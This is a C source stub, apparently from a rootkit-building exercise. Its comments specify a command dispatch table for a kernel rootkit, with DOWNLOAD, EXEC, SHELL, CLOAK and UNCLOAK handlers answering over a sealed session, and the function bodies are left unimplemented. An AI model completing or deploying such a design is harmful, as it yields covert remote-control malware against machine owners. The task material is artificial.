// SPDX-License-Identifier: GPL-2.0
// execution/dispatch.c - Function pointer dispatch table for commands.
#include <linux/string.h>
#include "rootkit.h"

/*
 * TODO: Define struct rk_dispatch_entry with fields:
 *   - const char *prefix
 *   - size_t prefix_len
 *   - rk_handler_t handler  (function pointer)
 *
 * Build a static const dispatch_table[] array mapping command
 * prefixes to handler functions. Longer prefixes first so
 * "UNHIDE FILE" is tried before "HIDE FILE".
 *
 * Commands with a trailing space in prefix take an argument
 * (everything after the prefix). Commands without trailing space
 * require an exact-length match.
 *
 * Table entries (prefix -> handler):
 *   "DOWNLOAD "  -> cmd_download
 *   "EXEC "      -> cmd_exec
 *   "UNCLOAK"    -> cmd_uncloak
 *   "STATUS"     -> cmd_status
 *   "SHELL"      -> cmd_shell
 *   "CLOAK"      -> cmd_cloak
 *   "PING"       -> cmd_ping
 *   "INFO"       -> cmd_info
 */

/*
 * TODO: Implement rk_send_response.
 *
 * Wrap rk_send_sealed: send the response string as sealed data.
 */
int rk_send_response(struct rk_session *s, const char *resp)
{
	return -ENOSYS;
}

/*
 * TODO: Implement rk_dispatch.
 *
 * 1. Strip trailing whitespace/newlines from buf.
 * 2. Walk the dispatch_table.
 * 3. For each entry, check if buf starts with prefix.
 * 4. If prefix ends with ' ', extract the argument
 *    (copy into a local char arg[RK_ARG_MAX]) and call handler.
 * 5. If prefix does not end with ' ', require exact length match,
 *    then call handler with NULL arg.
 * 6. If no match, send "ERR unknown command".
 */
int rk_dispatch(struct rk_session *s, const u8 *buf, size_t len)
{
	return -ENOSYS;
}
